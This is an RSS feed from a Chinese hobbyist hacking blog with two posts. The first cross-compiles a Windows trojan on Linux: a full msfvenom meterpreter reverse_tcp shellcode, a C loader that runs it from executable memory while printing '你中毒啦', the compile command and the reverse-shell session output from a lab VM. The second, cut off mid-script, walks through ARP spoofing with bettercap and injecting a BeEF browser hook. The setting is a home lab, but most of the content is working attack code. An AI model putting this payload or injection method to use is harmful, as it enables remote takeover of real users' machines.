<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>黑客 - 标签 - WeepingDogel</title>
        <link>http://weepingdogel.github.io/tags/%E9%BB%91%E5%AE%A2/</link>
        <description>黑客 - 标签 - WeepingDogel</description>
        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>weepingdogel@gmail.com (WeepingDogel)</managingEditor>
            <webMaster>weepingdogel@gmail.com (WeepingDogel)</webMaster><lastBuildDate>Thu, 06 May 2021 14:09:13 &#43;0800</lastBuildDate><atom:link href="http://weepingdogel.github.io/tags/%E9%BB%91%E5%AE%A2/" rel="self" type="application/rss+xml" /><item>
    <title>尝试在 Linux 下编译 exe 可执行文件</title>
    <link>http://weepingdogel.github.io/posts/%E5%B0%9D%E8%AF%95%E5%9C%A8linux%E4%B8%8B%E7%BC%96%E8%AF%91exe%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/</link>
    <pubDate>Thu, 06 May 2021 14:09:13 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/%E5%B0%9D%E8%AF%95%E5%9C%A8linux%E4%B8%8B%E7%BC%96%E8%AF%91exe%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/img/2021-05-07-18-18-28%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be.png" referrerpolicy="no-referrer">
            </div><h1 id="序">序</h1>
<p>最近一直在想有没有什么办法可以在 Linux 环境下编译 Windows 中可以运行的 exe 文件，由于自己没有 Windows 环境， 就算开虚拟机也多多少少有些不方便..</p>
<p>于是就去谷歌了一下.. 发现办法是有的.</p>
<p>这种办法叫做交叉编译, 要用到交叉编译器</p>
<p>我们看看维基百科上怎么说</p>
<blockquote>
<p>交叉编译器（英语：Cross compiler）是指一个在某个系统平台下可以产生另一个系统平台的可执行文件的编译器。交叉编译器在目标系统平台（开发出来的应用程序序所运行的平台）难以或不容易编译时非常有用。</p>
<p>交叉编译器的存在对于从一个开发主机为多个平台编译代码是非常有必要的。直接在平台上编译有时行不通，例如在一个嵌入式系统的单片机 ，因为它们没有操作系统，所以直接编译行不通。</p>
<p>交叉编译器和源代码至源代码编译器不同，交叉编译器用于二进制代码的跨平台软件开发，而源到源编译器是将某种编程语言的程序源代码作为输入，生成以另一种编程语言构成的等效源代码的编译器，但两者都是编程工具。</p>
<p>rel: <a href="https://zh.wikipedia.org/zh-hans/%E4%BA%A4%E5%8F%89%E7%B7%A8%E8%AD%AF%E5%99%A8" target="_blank" rel="noopener noreffer">https://zh.wikipedia.org/zh-hans/%E4%BA%A4%E5%8F%89%E7%B7%A8%E8%AD%AF%E5%99%A8</a></p>
</blockquote>
<p>概念就是这样..</p>
<h1 id="mingw-w64">mingw-w64</h1>
<p>这大概是个交叉编译器了</p>
<p>看看官网怎么说</p>
<blockquote>
<p>Mingw-w64 is an advancement of the original mingw.org project, created to support the GCC compiler on Windows systems. It has forked it in 2007 in order to provide support for 64 bits and new APIs. It has since then gained widespread use and distribution.</p>
<p>rel: <a href="https://mingw-w64.org/doku.php" target="_blank" rel="noopener noreffer">https://mingw-w64.org/doku.php</a></p>
</blockquote>
<p>好的接下来我们就安装它， 这里 Arch 就直接从 pacman 装上了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">$ sudo pacman -S mingw-w64
</span></span></code></pre></td></tr></table>
</div>
</div><p>
</p>
<h1 id="开始编译">开始编译</h1>
<p>那么， 装完之后就可以开始编译了</p>
<p>我打算编译一个 payload 试试看，嘿嘿</p>
<p>首先我们先用 <code>msfvenom</code> 生成一段 <code>shellcode</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=3333 -f c &gt;&gt; shellcode.c
</span></span></code></pre></td></tr></table>
</div>
</div><hr>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span> 
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x31\xff\x8b\x72\x28</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x8b\x58\x20\x50\x01\xd3</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xac</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\x6d\xa6\x24\x38\x68\x02</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x00\x35\x16\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5</span><span class="s">&#34;</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><hr>
<p>然后编写我们的代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b\x72\x28\x31\xff</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x57\x01\xd0\x8b\x40\x78</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x00\x70\x68\x02</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x00\x0d\x05\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;啊哈！你中毒啦！&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//ShellExecute(NULL, _T(&#34;open&#34;), _T(&#34;explorer.exe&#34;), _T(&#34;https://www.baiud.com&#34;), NULL, SW_SHOW);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">LPVOID</span> <span class="n">Memory</span> <span class="o">=</span> <span class="nf">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="n">Memory</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">((</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">Memory</span><span class="p">)();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>PS: 这是抄的(bushi)</p>
</blockquote>
<p>接下来进行编译</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ i686-w64-mingw32-gcc-10.2.0 payload.c -o payload.exe -v
</span></span></code></pre></td></tr></table>
</div>
</div><p>没有任何报错之后，丢进虚拟机里运行, 如果 meterpreter 能够上线则说明编译是有效的</p>
<h1 id="检验">检验</h1>
<p></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[*] Started reverse TCP handler on 192.168.0.112:3333 
</span></span><span class="line"><span class="cl">[*] Sending stage (175174 bytes) to 192.168.0.113
</span></span><span class="line"><span class="cl">[*] Meterpreter session 1 opened (192.168.0.112:3333 -&gt; 192.168.0.113:1045) at 2021-05-07 18:18:17 +0800
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">meterpreter &gt; sysinfo
</span></span><span class="line"><span class="cl">Computer        : CHINA-74ED62096
</span></span><span class="line"><span class="cl">OS              : Windows XP (5.1 Build 2600, Service Pack 3).
</span></span><span class="line"><span class="cl">Architecture    : x86
</span></span><span class="line"><span class="cl">System Language : zh_CN
</span></span><span class="line"><span class="cl">Domain          : WORKGROUP
</span></span><span class="line"><span class="cl">Logged On Users : 2
</span></span><span class="line"><span class="cl">Meterpreter     : x86/windows
</span></span><span class="line"><span class="cl">meterpreter &gt; 
</span></span></code></pre></td></tr></table>
</div>
</div><p>我们直接丢进去跑&hellip;</p>
<p>emmm 虽然字乱码了。</p>
<p>不过连接是建立了，那么说明编译是有效的～</p>
]]></description>
</item><item>
    <title> Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试</title>
    <link>http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</link>
    <pubDate>Tue, 02 Feb 2021 13:43:23 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/img/2021-02-02_13-51.png" referrerpolicy="no-referrer">
            </div><h2 id="序">序</h2>
<p>嗯&hellip; 惯例是要先说点废话嘛..</p>
<p>今天试着把 beef 和 bettercap 串在一起用了，发现有奇效～</p>
<p>然后如果是 IE 浏览器的话，可以用 beef 配合 msf 的 ms14-064 模块获取系统权限～</p>
<p>不多说啦，我们开始～</p>
<h3 id="测试环境">测试环境</h3>
<p>啊咧，先说说测试环境。</p>
<ul>
<li>
<p>攻击机</p>
<ul>
<li>Arch Linux</li>
<li>192.168.101.15</li>
</ul>
</li>
<li>
<p>靶机</p>
<ul>
<li>Windows XP on VirtualBox</li>
<li>192.168.101.43</li>
</ul>
</li>
</ul>
<p>条件有限，就只能用 XP 啦～</p>
<h3 id="用到的工具">用到的工具</h3>
<ol>
<li>bettercap
<ul>
<li>首先就是它啦～ 这是用来进行 ARP 欺骗的，可以进行 DNS 劫持和断网攻击，也就是常说的中间人攻击的一部分吧&hellip;</li>
</ul>
</li>
<li>beef
<ul>
<li>用来劫持浏览器&hellip; 然后可以干很多事情，具体的也不是很了解呢。</li>
</ul>
</li>
<li>msf
<ul>
<li>这个就是老朋友啦～</li>
</ul>
</li>
</ol>
<p>什么? nmap? 这次用不着哦～</p>
<h2 id="测试过程">测试过程</h2>
<p>首先是打开 <code>bettercap</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo bettercap
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后我们会看到这样的返回结果..</p>
<p></p>
<p><strong>注意：这里需要加 sudo , 因为它要调用网卡这样的硬件，需要 root 权限，如果不加 sudo 的话，会得到这样的提示。</strong></p>
<p></p>
<p>然后设置 arp 欺骗的目标：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set arp.spoof.targets 192.168.101.43
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>这里设置的 targets 是靶机的地址哦</strong></p>
<p>接下来启动 beef ，和上面说的一样要加 <code>sudo</code> 。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo beef
</span></span></code></pre></td></tr></table>
</div>
</div><p>得到返回：</p>
<p></p>
<p>那么来说说终端里显示的这几个链接</p>
<ul>
<li>Hook URL: <a href="http://192.168.101.15:3000/hook.js" target="_blank" rel="noopener noreffer">http://192.168.101.15:3000/hook.js</a>
<ul>
<li>这个就是上面所说的钩子地址了，浏览器一旦访问了带这些js的页面就会被 beef 勾住～</li>
<li>一会儿我们要把它写进一个攻击脚本里～</li>
</ul>
</li>
<li>UI URL: <a href="http://192.168.101.15:3000/ui/panel" target="_blank" rel="noopener noreffer">http://192.168.101.15:3000/ui/panel</a>
<ul>
<li>这个就是我们的 beef 操作页面了打开以后会有个登录页面，像封面那样，登录进去之后是这样的。
</li>
</ul>
</li>
</ul>
<p>关于用户名和密码是什么，这里就得提到，有些系统下的 beef 不能使用默认的用户名密码登录<code>（beef:beef）</code>，甚至不能启动，比如我的 Arch 就会这样。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[14:40:25][!] ERROR: Default username and password in use!
</span></span><span class="line"><span class="cl">[14:40:25]    |_  Change the beef.credentials.passwd in config.yaml
</span></span></code></pre></td></tr></table>
</div>
</div><p>这个时候你需要做的是修改 <code>config.yaml</code> 这个文件中的用户名和密码，我的位置在 <code>/usr/share/beef/config.yaml</code></p>
<p>改成这样</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">beef</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;0.5.0.0-alpha-pre&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># More verbose messages (server-side)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">debug</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># More verbose messages (client-side)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">client_debug</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># Used for generating secure tokens</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">crypto_default_value_length</span><span class="p">:</span><span class="w"> </span><span class="m">80</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># Credentials to authenticate in BeEF.</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># Used by both the RESTful API and the Admin interface</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">credentials</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">user</span><span class="p">:</span><span class="w">   </span><span class="s2">&#34;随便起个名字&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">passwd</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;随便想个密码&#34;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>然后你就可以启动了，登录的时候用的就是你设置的用户名个密码。</p>
<p>好了，话不多说，我们继续。</p>
<p>接下来我们要做的是写一个 js 脚本，给 bettercap 用。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">onResponse</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">ContentType</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;text/html&#39;</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">body</span><span class="o">=</span><span class="nx">res</span><span class="p">.</span><span class="nx">ReadBody</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">body</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;&lt;/head&gt;&#39;</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">){</span>
